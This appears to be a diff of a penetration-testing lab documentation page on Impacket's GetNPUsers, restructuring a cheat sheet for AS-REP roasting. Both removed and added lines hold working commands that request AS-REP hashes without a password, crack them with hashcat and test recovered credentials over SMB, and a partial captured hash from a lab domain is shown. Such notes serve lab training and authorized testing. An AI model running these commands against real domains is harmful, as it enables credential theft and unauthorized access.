@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/getnpusers.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Check preauthentication behavior for a bounded user list
+[Search this tool’s saved examples](/commands/notebook?tool=getnpusers) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Check preauthentication behavior for a bounded user list
 
 **Run in:** Kali. **Requires:** A known realm, reachable KDC and candidate usernames; no supplied password is used in this example.
 
@@ -21,128 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
 ```
 
-**Read the result:** A returned AS-REP artifact identifies an account for which the requested preauthentication condition applied.
-
-**If Unknown users, preauthentication-required responses and timeouts are mixed together:** Unknown users, accounts requiring preauthentication, and connectivity errors are distinct; the artifact requires its matching offline cracking format.
+**What the result establishes:** A returned AS-REP artifact identifies an account for which the requested preauthentication condition applied.
 
 **Next check:** Separate each response class; handle returned artifacts using their actual format and retain the associated account name.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Verify the preauthentication condition first
-
-AS-REP roasting concerns accounts for which Kerberos preauthentication is not required. It is a different branch from requesting service tickets for SPN-bearing accounts. You need a valid domain/DC context and candidate usernames; you do not need to assume that every existing account has this setting.
-
-### Discover the account setting with authenticated enumeration
-
-```powershell
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,Enabled,Description
-```
-
-Record the identity and account state. Where authenticated LDAP enumeration is unavailable, a scoped username list can test the condition directly.
-
-### Request the artifact and preserve output
-
-```bash
-impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP \
-  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-
-nxc ldap DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' --asreproast asrep.hash
-```
-
-These are alternative workflows, not a requirement to run both. Distinguish an unknown principal, an account requiring preauthentication, an account-state restriction, and a network/KDC error. Keep the output lines that identify which account produced which artifact.
-
-### Use the matching offline format
-
-```bash
-head -n 2 asrep.hash
-# For the corresponding $krb5asrep$23$ format:
-hashcat -m 18200 asrep.hash WORDLIST
-hashcat -m 18200 asrep.hash --show
-```
-
-Confirm the actual artifact prefix before selecting the mode. Preserve the username/domain metadata and delimiters; copying only a fragment can make the input unparsable.
-
-### Turn recovery into a verified lead
-
-```bash
-nxc smb TARGET_IP -d DOMAIN_FQDN -u RECOVERED_USERNAME -p 'RECOVERED_PASSWORD' --shares
-```
-
-One successful login establishes a particular identity on a particular service. Continue with membership, share and ACL enumeration. A low-privilege account can still be useful for directory queries, but recovery alone is not domain compromise.
-
-If a request or offline attempt fails, check the DC/domain, candidate spelling, account status, artifact format and selected mode. Do not convert a timeout into a conclusion about the preauthentication setting.
-
-## GetNPUsers.py: choose the operation and read the result
-
-Check accounts without Kerberos preauthentication.
-
-### What the result establishes
-
-A returned AS-REP artifact identifies an account for which the requested preauthentication condition applied.
-
-### Prerequisites and common failures
-
-Unknown users, accounts requiring preauthentication, and connectivity errors are distinct; the artifact requires its matching offline cracking format.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-```
-
-### Example 2: AS-REP Roasting: Quick Reference
-
-Run in: **Saved lab example**.
-
-```bash
-# Linux (Impacket) — with a userlist (no creds) or authenticated
-GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
-nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
-```
-
-Saved context: [AS-REP Roasting: Quick Reference — AS-REP Roasting: Quick Reference](/active-directory/asrep-roasting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Kerberos / Spns
-
-Run in: **Saved lab example**.
-
-```bash
-GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
-    # Find user accounts with registered SPNs
-
-GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
-    # Request TGS tickets for Kerberoasting
-
-GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
-    # Find accounts vulnerable to AS-REP roasting
-
-GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
-    # Query for AS-REP roastable accounts using credentials
-```
-
-Saved context: [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Check accounts without Kerberos preauthentication.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=getnpusers) · [All tools](/index)
 
 ## Commands
 
@@ -152,14 +41,11 @@ Replace UPPER_CASE values with your lab values.
 impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [AS-REP Roasting: Quick Reference — Example 1: Commands](/active-directory/asrep-roasting#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| Unknown users, preauthentication-required responses and timeouts are mixed together | Unknown users, accounts requiring preauthentication, and connectivity errors are distinct; the artifact requires its matching offline cracking format. |
 
 ## Notebook recipes
 
@@ -167,9 +53,31 @@ impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format
 
 <AccordionGroup>
 
-<Accordion title="AS-REP Roasting: Quick Reference">
+<Accordion title="Request the artifact and preserve output">
 
-### AS-REP Roasting: Quick Reference
+### Request the artifact and preserve output
+
+**AS-REP Roasting: Quick Reference**
+
+```bash
+impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP \
+  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+
+nxc ldap DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' --asreproast asrep.hash
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AS-REP Roasting: Quick Reference — Request the artifact and preserve output](/active-directory/asrep-roasting#request-the-artifact-and-preserve-output)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Turn recovery into a verified lead">
+
+### Turn recovery into a verified lead
 
 **AS-REP Roasting: Quick Reference**
 
@@ -182,7 +90,7 @@ nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AS-REP Roasting: Quick Reference — Example 2: AS-REP Roasting: Quick Reference](/active-directory/asrep-roasting#example-2-as-rep-roasting-quick-reference) · [AS-REP Roasting: Quick Reference — Existing notes and worked examples](/active-directory/asrep-roasting#existing-notes-and-worked-examples)
+**Original note sections:** [AS-REP Roasting: Quick Reference — Turn recovery into a verified lead](/active-directory/asrep-roasting#turn-recovery-into-a-verified-lead)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -211,7 +119,7 @@ GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AS-REP Roasting: Quick Reference — Example 3: Kerberos / Spns](/active-directory/asrep-roasting#example-3-kerberos-/-spns) · [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns)
+**Original note sections:** [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -242,7 +150,7 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+**Original note sections:** [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -285,28 +193,11 @@ $krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8
 
 </Accordion>
 
-<Accordion title="Impacket: Script Quick Reference">
-
-### Impacket: Script Quick Reference
-
-**Impacket: Script Quick Reference**
-
-Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py ,  getST.py Kerberos tools
-
-```text
-GetNPUsers.py
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 
 {/* VAULT_RELATED_START */}
 
@@ -315,5 +206,3 @@ GetNPUsers.py
 - [AS-REP Roasting: Quick Reference](/active-directory/asrep-roasting)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
